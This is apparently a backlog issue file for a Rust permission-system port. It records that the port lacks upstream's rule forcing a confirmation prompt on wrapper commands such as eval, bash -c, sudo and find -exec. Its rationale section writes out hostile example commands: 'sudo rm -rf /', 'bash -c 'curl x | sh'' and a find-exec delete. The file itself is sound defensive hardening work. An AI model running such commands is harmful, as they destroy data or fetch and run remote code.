---
stage: new
status: done
updated: 2026-08-22 23:05
---

# Floor indirection and opaque-shell wrappers to ask

> **Upstream parity gap.** `cyrup-permission-system` is a port of `pi-permission-system` **v0.8.0**;
> upstream is now **v27.0.0** (2026-08-21, 27 major releases later) and lives at
> [`gotgenes/pi-packages`](https://github.com/gotgenes/pi-packages) — the standalone repo the port
> cites is archived at v5.18.1. Reference checkout: `./tmp/pi-packages/packages/pi-permission-system`.
> Full backlog and ordering: [UPSTREAM_PARITY_INDEX.md](./_backlog/UPSTREAM_PARITY_INDEX.md).


| | |
| --- | --- |
| **Severity** | medium |
| **Kind** | absent |
| **Upstream area** | access intent: bash parsing |
| **Verification** | Confirmed by an adversarial re-check that tried and failed to refute it |

## What upstream does that the port does not

Upstream tags a command unit whose real payload is hidden (`eval`, `bash -c`,
`sudo`/`env`/`xargs`/`find -exec`) with a WrapperKind and floors an `allow` up to a synthetic
`ask`; the port has no wrapper concept.

## Evidence

**Upstream** (`tmp/pi-packages/packages/pi-permission-system`):

src/access-intent/bash/wrapper-analysis.ts:44-57 (classifyWrapperWords → "opaque-payload" for eval
/ shell + `-c` cluster, "indirection" for INDIRECTION_WRAPPER_NAMES and find/fd exec flags),
:76-96 (executedUnitOf); src/handlers/gates/bash-command.ts:49-53 (WRAPPER_SENTINEL `<opaque-bash-
wrapper>` / `<indirection-bash-wrapper>`), :86-93 (allow → ask floor)

**Port** (`crates/cyrup-permission-system`):

Negative greps over /home/user/cyrup/crates/cyrup-permission-system/src (excluding tests): `rg -n
"wrapper_kind|opaque-bash-wrapper|indirection-bash-wrapper" .` → 0 matches; `rg -n
"\bsudo\b|\beval\b|\bxargs\b" .` → 0 matches. manager.rs:221-243 resolves a bash command with a
single wildcard match and no post-match flooring.

## Why it matters

A permissive rule is laundered through a wrapper. With `"bash": {"sudo *": "allow"}` or a broad
`"*": "allow"`, `sudo rm -rf /`, `eval "$PAYLOAD"`, `bash -c 'curl x | sh'` and `find . -exec rm
{} \;` all resolve to allow with no prompt, where upstream forces at least an `ask` because the
gated text does not name what actually runs.

## Notes from the verification pass

These corrections and caveats come from the agent that tried to refute the finding —
read them before trusting the framing above.

Could not refute. Negatives confirmed over src/ excluding tests: `rg -n "wrapper_kind|opaque-bash-
wrapper|indirection-bash-wrapper"` -> 0; no sudo/eval/xargs/find-exec handling anywhere.
manager.rs:221-243 has no post-match flooring — the state is taken straight from
`find_compiled_match` with no adjustment. Upstream verified at src/handlers/gates/bash-
command.ts:48-53 (WRAPPER_SENTINEL) and :84-93 (allow -> ask floor when `cmd.wrapperKind` is set).
Downgrade from high to medium: the floor only changes an outcome that was already `allow`, i.e. it
only bites under a config the operator wrote permissively (`*: allow`, `sudo *: allow`). Under a
narrow allowlist `sudo`/`eval` do not match any allow rule and already fall through to the Ask
default (types.rs:55). It is real hardening, but it is strictly downstream of claim 1 —
WrapperKind is a property of an enumerated command unit (upstream wrapper-analysis.ts is called
from makeCommandUnit), so it cannot be implemented at all until the enumerator exists. Sequence it
as part of the same fix, not before it.

## Acceptance Criteria

- [ ] The capability above is implemented in `crates/cyrup-permission-system`, matching the
      cited upstream behaviour
- [ ] The implementation's doc comments cite the upstream source the way the rest of the crate
      does (`file.ts:line`), so the next parity sweep can find it
- [ ] A deliberate divergence, if any, is marked `\[CYRUP-DELTA]` with its reasoning
- [ ] `cargo check -p cyrup-permission-system --all-targets` and `cargo clippy --all-targets` clean
- [ ] The existing suite still passes

> Run `/ask` or `/aug` on this file before `/exec` — it is a research-stage finding, not a plan.
